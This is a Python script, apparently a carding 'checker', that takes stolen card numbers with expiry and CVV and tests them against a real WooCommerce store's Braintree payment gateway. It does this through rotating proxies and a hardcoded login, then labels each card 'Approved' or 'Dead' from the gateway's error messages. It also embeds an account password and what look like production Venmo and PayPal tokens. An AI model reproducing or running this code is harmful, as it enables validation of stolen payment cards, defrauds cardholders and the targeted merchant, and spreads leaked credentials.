import base64
import requests
import random
import json
import names
from random_address import real_random_address



direc = real_random_address()

def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

       
class b3:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        self.last_4 = self.cc[12:]
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        

    def main(self):
        try:
           
            session = requests.Session()
        
            from srca.configs import rnd_prox
            session.proxies = rnd_prox()
            
            headers = {'authority': 'www.springwellwater.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','referer': 'https://www.springwellwater.com/account/','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            r1 = session.get('https://www.springwellwater.com/account/', headers=headers)
            woocommerce_login_nonce = find_between(r1.text, '<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="', '"')
                    
            headers = {'authority': 'www.springwellwater.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.springwellwater.com','referer': 'https://www.springwellwater.com/account/?password-reset=true','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            params = {'password-reset': 'true'}
            data = {'username': 'dolofiv881@seosnaps.com','password': 'Cuentasgratis123','rememberme': 'forever','woocommerce-login-nonce': f'{woocommerce_login_nonce}','_wp_http_referer': '/account/?password-reset=true','login': 'Log in'}
            session.post('https://www.springwellwater.com/account/', params=params, headers=headers, data=data)
            
            headers = {'authority': 'www.springwellwater.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','referer': 'https://www.springwellwater.com/account/','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            session.get('https://www.springwellwater.com/account/', headers=headers)
            
            headers = {'authority': 'www.springwellwater.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','referer': 'https://www.springwellwater.com/account/edit-address/','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            session.get('https://www.springwellwater.com/account/payment-methods/', headers=headers)
            
            headers = {'authority': 'www.springwellwater.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','referer': 'https://www.springwellwater.com/account/payment-methods/','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            r9 = session.get('https://www.springwellwater.com/account/add-payment-method/', headers=headers)
            response = r9.text
            bearer_token = find_between(r9.text, 'var wc_braintree_client_token = ["', '"]')
            bearer_token = base64.b64decode(bearer_token).decode('utf-8')
            bearer_token = find_between(bearer_token, '"authorizationFingerprint":"', '","')
            payment_nonce = find_between(response, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')

            headers = {'authority': 'payments.braintree-api.com','accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': f'Bearer {bearer_token}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            json_data = {'clientSdkMetadata': {'source': 'session','integration': 'custom','sessionId': '135eb39f-d142-4540-af28-c0b43c90b771',},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': f'{self.cc}','expirationMonth': f'{self.mes}','expirationYear': f'{self.ano}','cvv': f'{self.cvv}','billingAddress': {'postalCode': '10080','streetAddress': 'Street 345',},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard'}
            r10 = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            token_cc = find_between( r10.text, '"token":"', '",')
            
            config_data = {"environment": "production","clientApiUrl": "https://api.braintreegateway.com:443/merchants/cpyskxzn56yz3mv5/client_api","assetsUrl": "https://assets.braintreegateway.com","analytics": {"url": "https://session-analytics.braintreegateway.com/cpyskxzn56yz3mv5"},"merchantId": "cpyskxzn56yz3mv5","venmo": "off","graphQL": {"url": "https://payments.braintree-api.com/graphql", "features": ["tokenize_credit_cards"]},"applePayWeb": {"countryCode": "US", "currencyCode": "USD", "merchantIdentifier": "cpyskxzn56yz3mv5", "supportedNetworks": ["visa", "mastercard", "amex", "discover"]},"kount": {"kountMerchantId": None},"challenges": ["cvv", "postal_code"],"creditCards": {"supportedCardTypes": ["Discover", "JCB", "MasterCard", "Visa", "American Express", "UnionPay"]},"threeDSecureEnabled": False,"threeDSecure": None,"androidPay": {"displayName": "SpringWell Water Filtration Systems","enabled": True,"environment": "production","googleAuthorizationFingerprint": f"{bearer_token}","paypalClientId": "ARTsIkKTVLDdbhQAIqCa2z8SuonFm8DJZtKjCHVNFTAl6Og_lHufu9biM25s51NPQ7Atop9iWpOjMInM","supportedNetworks": ["visa", "mastercard", "amex", "discover"]},"payWithVenmo": {"merchantId": "3998336520117772027","accessToken": "access_token$production$cpyskxzn56yz3mv5$99165f99a2db21235ad5d8a2450629b3","environment": "production","enrichedCustomerDataEnabled": True},"paypalEnabled": True,"paypal": {"displayName": "SpringWell Water Filtration Systems","clientId": "ARTsIkKTVLDdbhQAIqCa2z8SuonFm8DJZtKjCHVNFTAl6Og_lHufu9biM25s51NPQ7Atop9iWpOjMInM","assetsUrl": "https://checkout.paypal.com","environment": "live","environmentNoNetwork": False,"unvettedMerchant": False,"braintreeClientId": "ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled": True,"merchantAccountId": "springwellwaterfiltrationsystems_instant","payeeEmail": None,"currencyIsoCode": "USD"}}
            headers = {'authority': 'www.springwellwater.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.springwellwater.com','referer': 'https://www.springwellwater.com/account/add-payment-method/','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'}
            data = {'payment_method': 'braintree_cc','braintree_cc_nonce_key': token_cc,'braintree_cc_device_data': '{"device_session_id":"e6e59cf28426410162dc2f24c3925b3b","fraud_merchant_id":null,"correlation_id":"0b6980216a1d90bb09ac53ed57c6bd4e"}','braintree_cc_3ds_nonce_key': '','braintree_cc_config_data': json.dumps(config_data),'woocommerce-add-payment-method-nonce': payment_nonce,'_wp_http_referer': '/account/add-payment-method/','woocommerce_add_payment_method': '1'}
            r11 = session.post('https://www.springwellwater.com/account/add-payment-method/', headers=headers, data=data)
            
            error = find_between(r11.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')

            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', 'Approved ✅'
            msg = error[1].split('t method. Reason: ')
            result = msg[1].strip()
            if 'Nice! New payment method added' in result:return 'Approved! ✅', 'Approved ✅'
            elif 'Invalid postal code and cvv' in result:return 'Approved! ✅', result
            elif 'Invalid postal code or street address.' in result:return 'Approved! ✅', result
            elif 'avs_and_cvv' in result:return 'Approved! ✅', result
            elif 'Insufficient Funds' in result:return 'Approved! ✅', result
            elif 'Card Issuer Declined CVV' in result:return 'Approved! ✅', result
            else:return 'Dead! ❌ ', result
        
        except: return 'Dead! ❌ ', 'Gateway Rejected: risk_threshold'



